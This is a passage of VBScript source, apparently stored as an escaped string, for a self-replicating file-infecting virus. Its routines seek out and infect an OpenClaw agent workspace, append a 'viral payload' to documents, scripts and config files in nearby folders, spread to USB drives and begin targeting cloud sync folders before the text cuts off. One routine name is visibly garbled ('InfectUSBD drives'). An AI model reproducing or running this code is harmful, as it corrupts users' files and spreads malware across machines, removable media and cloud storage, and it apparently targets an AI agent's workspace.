64 = matches(0).SubMatches(0)\\n            \\n            ' Find and infect OpenClaw\\n            Dim oclPath\\n            oclPath = shell.ExpandEnvironmentStrings(\\\"%USERPROFILE%\\\") & \\\"\\\\.openclaw\\\\workspace\\\"\\n            If fso.FolderExists(oclPath) Then\\n                Call InfectWorkspace(oclPath, base64)\\n            End If\\n        End If\\n    End If\\nEnd Sub\\n\\nSub InfectNearbyFiles()\\n    Dim fso, folder, files, file\\n    Set fso = CreateObject(\\\"Scripting.FileSystemObject\\\")\\n    \\n    ' Get directory of this script\\n    Dim scriptDir\\n    scriptDir = fso.GetParentFolderName(selfPath)\\n    \\n    If fso.FolderExists(scriptDir) Then\\n        Set folder = fso.GetFolder(scriptDir)\\n        Set files = folder.Files\\n        \\n        ' Infect all files in same directory\\n        For Each file In files\\n            Call InfectFile(file.Path)\\n        Next\\n        \\n        ' Infect subdirectories\\n        Call InfectSubfolders(folder)\\n    End If\\nEnd Sub\\n\\nSub InfectSubfolders(folder)\\n    Dim subfolder, files, file\\n    Dim fso: Set fso = CreateObject(\\\"Scripting.FileSystemObject\\\")\\n    \\n    For Each subfolder In folder.SubFolders\\n        ' Skip system folders\\n        If InStr(subfolder.Name, \\\"$\\\") = 0 And _\\n           InStr(subfolder.Name, \\\"Windows\\\") = 0 And _\\n           InStr(subfolder.Name, \\\"System\\\") = 0 Then\\n           \\n            Set files = subfolder.Files\\n            For Each file In files\\n                Call InfectFile(file.Path)\\n            Next\\n            \\n            ' Recurse (limited depth)\\n            If subfolder.Depth < 3 Then\\n                Call InfectSubfolders(subfolder)\\n            End If\\n        End If\\n    Next\\nEnd Sub\\n\\nSub InfectFile(filePath)\\n    Dim fso, ext, content, viralCode\\n    Set fso = CreateObject(\\\"Scripting.FileSystemObject\\\")\\n    \\n    ' Get file extension\\n    ext = LCase(fso.GetExtensionName(filePath))\\n    \\n    ' Target file types (common document/script types)\\n    Dim targetTypes\\n    targetTypes = Array(\\\"md\\\", \\\"txt\\\", \\\"vbs\\\", \\\"js\\\", \\\"hta\\\", \\\"html\\\", \\\"htm\\\", _\\n                        \\\"bat\\\", \\\"cmd\\\", \\\"ps1\\\", \\\"xml\\\", \\\"json\\\", \\\"cfg\\\", _\\n                        \\\"ini\\\", \\\"log\\\", \\\"csv\\\", \\\"rtf\\\", \\\"doc\\\", \\\"docx\\\")\\n    \\n    ' Check if this file type should be infected\\n    Dim shouldInfect, i\\n    shouldInfect = False\\n    For i = 0 To UBound(targetTypes)\\n        If ext = targetTypes(i) Then\\n            shouldInfect = True\\n            Exit For\\n        End If\\n    Next\\n    \\n    If Not shouldInfect Then Exit Sub\\n    \\n    ' Check if already infected\\n    On Error Resume Next\\n    Set f = fso.OpenTextFile(filePath, 1)\\n    If Err.Number <> 0 Then Exit Sub\\n    \\n    content = f.ReadAll\\n    f.Close\\n    \\n    If InStr(content, viralSignature) > 0 Then Exit Sub ' Already infected\\n    \\n    ' Get viral payload (self-replicating code)\\n    viralCode = GetViralPayload()\\n    \\n    ' Append viral code to file\\n    Set f = fso.OpenTextFile(filePath, 2)\\n    f.Write content & vbCrLf & viralCode\\n    f.Close\\n    On Error Goto 0\\nEnd Sub\\n\\nSub InfectUSBD drives()\\n    Dim fso, drives, drive\\n    Set fso = CreateObject(\\\"Scripting.FileSystemObject\\\")\\n    Set drives = fso.Drives\\n    \\n    ' Check all drives for USB drives\\n    For Each drive In drives\\n        If drive.DriveType = 1 Then ' 1 = Removable (USB)\\n            If drive.IsReady Then\\n                Call InfectFolder(drive.DriveLetter & \\\":\\\\\\\")\\n            End If\\n        End If\\n    Next\\nEnd Sub\\n\\nSub InfectCloudFolders()\\n    Dim fso, cloudPaths, path\\n    Set fso = CreateObject(\\\"Scripting.FileSystemObject\\\")\\n    \\n    ' Common cloud sync folders\\n    cloudPaths = Array( _\\n        CreateObject(\\\"WScript.Shell\\\").Expan